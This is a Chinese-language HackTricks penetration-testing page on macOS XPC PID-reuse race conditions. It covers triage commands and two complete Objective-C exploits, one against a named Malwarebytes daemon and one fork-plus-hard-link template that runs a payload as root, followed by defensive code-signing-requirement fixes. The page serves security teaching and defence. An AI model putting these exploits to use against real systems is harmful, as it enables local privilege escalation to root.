# macOS PID Reuse

{{#include ../../../../../../banners/hacktricks-training.md}}

## PID Reuse

当 macOS **XPC service** 通过解析调用方的 **PID**，而不是使用与所接收消息绑定的凭据来验证调用方时，可能容易受到 PID reuse attack 的影响。实际利用原语并不是等待 PID namespace 回绕，而是攻击者发送 XPC request，然后立即使用 **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** 并结合 `POSIX_SPAWN_SETEXEC`，将攻击者的 process image 替换为一个**允许的 binary，同时保留原 PID**。<sup>[[1]](#references)[[2]](#references)</sup>

如果 server 将 request 出队后，才将该 numeric PID 解析为一个 live process，以执行 code-signing、entitlement、path 或 parent-process 检查，那么它看到的将是 replacement binary，而不是发送该 message 的 process。`POSIX_SPAWN_START_SUSPENDED` 可让受信任的 replacement 保持存活并稳定存在，以便 server 执行检查。<sup>[[1]](#references)[[2]](#references)</sup>

### 实际发生竞争的对象

存在漏洞的流程是 **message-identity TOCTOU**，而不只是“PIDs 可以重复”：<sup>[[1]](#references)[[2]](#references)</sup>

1. 攻击者 process 建立或恢复一个 XPC connection，并将 privileged request 加入队列。
2. 在 service 将 connection 的 PID 转换为 `SecCodeRef` 或其他 process object 之前，攻击者使用 `POSIX_SPAWN_SETEXEC`，将同一个 process 覆盖为一个 approved executable。
3. service 验证当前附加到该 PID 的 approved image，然后 dispatch 已经排队的、由攻击者控制的 request。

授权 data flow 中的任何 PID bridge 都值得怀疑：`-[NSXPCConnection processIdentifier]`、`xpc_connection_get_pid` 或 `audit_token_to_pid`，后续再调用 `SecCodeCopyGuestWithAttributes`/`kSecGuestAttributePid`、`proc_pidpath`、`NSRunningApplication(processIdentifier:)` 或 custom signature verifier。仅将 PID 用于 logging 并不足够；需要确认它是否会影响 allow/deny decision。还应检查 error paths：先尝试 audit-token lookup，但**在失败时回退到 PID**，会重新引入相同的 race。该 fallback pattern 曾出现在 2026 年对 Intego privileged XPC services 的分析中。<sup>[[3]](#references)</sup>

### 快速静态和动态 triage

从 connection handler 开始，跟踪每个生成 PID 的调用，查看其是否进入 code-signing、entitlement、executable-path 或 version checks。以下命令可对 candidate helper 进行快速初步检查；即使是 stripped binaries，通常仍会暴露 imported symbols、Objective-C selectors 或 diagnostic strings：<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
```bash
BIN="/path/to/privileged/helper"
nm -um "$BIN" 2>/dev/null | rg 'xpc_connection_get_pid|SecCodeCopyGuestWithAttributes'
otool -ov "$BIN" 2>/dev/null | rg 'processIdentifier|auditToken|setCodeSigningRequirement'
strings -a "$BIN" | rg -i 'guest.*pid|signature.*pid|process identifier|audit token|peer.*requirement'
```
在受控测试期间，同时 break 或 hook PID source 及其 verifier。命中 `xpc_connection_get_pid` 或 `-processIdentifier` 只能作为线索；有用的证据是：在 request 被接收后，稍后对**同一个整数**进行 lookup。Frida 还可以 hook application-specific verifier 和 privileged selector，以测量 PID race 获胜时 selector 是否会执行。<sup>[[3]](#references)</sup>

### Exploit example

如果你发现函数 **`shouldAcceptNewConnection`**，或发现一个被它调用的函数正在 **calling** **`processIdentifier`**，而没有调用 **`auditToken`**，这很可能意味着它正在 **verifying the process PID**，而不是 audit token。\
例如下图（取自参考资料）：<sup>[[1]](#references)</sup>

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

查看这个 exploit 示例（同样取自参考资料），了解 exploit 的两个部分：<sup>[[1]](#references)</sup>

- 一个用于**生成多个 forks**
- **每个 fork** 都会在发送 message 后立即执行 **`posix_spawn`**，同时向 XPC service **发送** **payload**

> [!CAUTION]
> 使用 Objective-C process 中的 `fork()` 进行 race 时，请在已导出 `OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES` 的情况下启动 exploit，或嵌入 `__objc_fork_ok` marker：
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
使用 **`NSTasks`** 并通过参数启动子进程来利用 RC 的第一种方式
```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```
{{#endtab}}

{{#tab name="fork"}}
此示例使用原始 **`fork`** 来启动 **将利用 PID race condition 的子进程**，然后通过 Hard link 利用 **另一个 race condition**：
```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload.
*/
void *check_race(void *arg) {
while(!pwned) {
// Overwrite with contents of the legit binary
system("cat ./legit_bin > hard_link");
usleep(50000);

// Overwrite with contents of the payload to execute
// TODO: COMPILE YOUR OWN PAYLOAD BIN
system("cat ./payload > hard_link");
usleep(50000);
}
return NULL;
}

void child_xpc_pid_rc_abuse(){
// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
extern char **environ;

// Connect with XPC service
// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
NSString*  service_name = @"com.example.Helper";
NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
// TODO: CNAGE THE PROTOCOL NAME
NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
[connection setRemoteObjectInterface:interface];
[connection resume];

id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
NSLog(@"[-] Something went wrong");
NSLog(@"[-] Error: %@", error);
}];

NSLog(@"obj: %@", obj);
NSLog(@"conn: %@", connection);

// Call vulenrable XPC function
// TODO: CHANGE NAME OF FUNCTION TO CALL
[obj DoSomething:^(_Bool b){
NSLog(@"Response, %hdd", b);
}];

// Change current process to the legit binary suspended
char target_binary[] = kValid;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
* Function to perform the PID race condition using children calling the XPC exploit.
*/
void xpc_pid_rc_abuse() {
#define RACE_COUNT 1
extern char **environ;
int pids[RACE_COUNT];

// Fork child processes to exploit
for (int i = 0; i < RACE_COUNT; i++) {
int pid = fork();
if (pid == 0) {  // If a child process
child_xpc_pid_rc_abuse();
}
printf("forked %d\n", pid);
pids[i] = pid;
}

// Wait for children to finish their tasks
sleep(3);

// Terminate child processes
for (int i = 0; i < RACE_COUNT; i++) {
if (pids[i]) {
kill(pids[i], 9);
}
}
}

int main(int argc, const char * argv[]) {
// Create and set execution rights to 'hard_link' file
system("touch hard_link");
system("chmod +x hard_link");

// Create thread to exploit sign verification RC
pthread_t thread;
pthread_create(&thread, NULL, check_race, NULL);

while(!pwned) {
// Try creating 'download' directory, ignore errors
system("mkdir download 2>/dev/null");

// Create a hardlink
// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
system("ln hard_link download/legit_bin");

xpc_pid_rc_abuse();
usleep(10000);

// The payload will generate this file if exploitation is successful
if (access("/tmp/pwned", F_OK ) == 0) {
pwned = true;
}
}

return 0;
}
```
{{#endtab}}
{{#endtabs}}

## 让竞争条件可复现

以下调优要点在可用的 PID reuse exploits 和近期的 privileged-helper 测试中反复出现：<sup>[[1]](#references)[[3]](#references)</sup>

- 发送请求后立即调用 `posix_spawn`；**不要**等待回复。请求必须已经排队，而 server 的 PID lookup 会在 image replacement 之后发生。
- 同时保留 `POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED`。第一个 flag 会保留 racing process 的 PID；第二个 flag 会防止有效 target 在 validation 之前退出或改变状态。
- 使用多个短生命周期 racers，并重试完整的 connection/request/exec sequence。最佳数量取决于 target；过多的 children 可能拖慢 service，使窗口变得更差。
- Replacement 必须满足 server 的**全部**要求。可能时应复用 legitimate client binary，并首先使用 `codesign -d -r- "/path/to/client.app"` 检查其 designated requirement。
- 首先调用一个无害的 exported selector 或只读 method。这可以将 authentication 成功与之后 privileged primitive 的成功 exploitation 区分开来。

## 避免 PID bridge

在 macOS 13+ 中，Foundation 提供了 `-[NSXPCConnection setCodeSigningRequirement:]`。只设置一次 peer requirement，并且必须在 `resume` **之前**设置；格式错误的 requirement strings 会引发 exception（或 Swift fatal error），而来自不满足该 requirement 的 peer 的消息会使 connection 失效。这样，XPC 就能在无需 application code 解析 PID 的情况下强制执行 peer 的 code identity。<sup>[[6]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)l shouldAcceptNewConnection:(NSXPCConnection *)c {
@try {
NSString *req = @"anchor apple generic and identifier \"com.example.client\" "
@"and certificate leaf[subject.OU] = \"TEAMID\"";
[c setCodeSigningRequirement:req];
} @catch (NSException *e) {
return NO;
}
c.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(Helper)];
c.exportedObject = self;
[c resume];
return YES;
}
```
对于 macOS 26+ 上现代的 low-level listener API，`xpc_listener_set_peer_requirement` 会在 listener inactive 时应用经过验证的 `xpc_peer_requirement_t`。XPC 会丢弃不满足该要求的请求；从 listener 创建的 peer sessions **不会继承该要求**，因此当这些 sessions 用于授权 privileged operations 时，也应应用适当的 session requirement。<sup>[[7]](#references)</sup>

> [!WARNING]
> 不要通过复制 audit token，然后将其转换回 PID 以执行实际的 `SecCode` lookup 来“修复”此问题。在整个 authorization decision 过程中保留从 audit token 派生的 identity，或者端到端使用 XPC peer-requirement API。<sup>[[2]](#references)[[6]](#references)</sup> connection-wide audit-token APIs 还存在一种独立的 race class，详见 [macOS xpc_connection_get_audit_token Attack](macos-xpc_connection_get_audit_token-attack.md)。

## 其他示例

- [**Intego X9：为什么你的 macOS antivirus 不应信任 PIDs**](https://blog.quarkslab.com/intego_lpe_macos_2.html) - 针对某 antivirus 的 privileged helper 的 LPE，该 helper 通过 PID 对 clients 进行 authentication。<sup>[[3]](#references)</sup>
- [**利用 GOG Galaxy XPC service 在 macOS 中进行 privilege escalation**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)<sup>[[4]](#references)</sup>
- [**Rootpipe Reborn（Part II）**](https://objective-see.org/blog/blog_0x41.html)<sup>[[5]](#references)</sup>



## References

- [1] [学习 XPC exploitation - Part 2：对 PID 说不！](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [2] [不要信任 PID！一个简单 logic bug 的故事，以及在哪里可以找到它 - Samuel Groß（WarCon 2018）](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [3] [Intego X9：为什么你的 macOS antivirus 不应信任 PIDs](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [4] [利用 GOG Galaxy XPC service 在 macOS 中进行 privilege escalation](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [5] [Rootpipe Reborn（Part II）](https://objective-see.org/blog/blog_0x41.html)
- [6] [Apple Developer — `NSXPCConnection.setCodeSigningRequirement`](https://developer.apple.com/documentation/foundation/nsxpcconnection/setcodesigningrequirement(_:))
- [7] [Apple Developer — `xpc_listener_set_peer_requirement`](https://developer.apple.com/documentation/xpc/xpc_listener_set_peer_requirement)
{{#include ../../../../../../banners/hacktricks-training.md}}
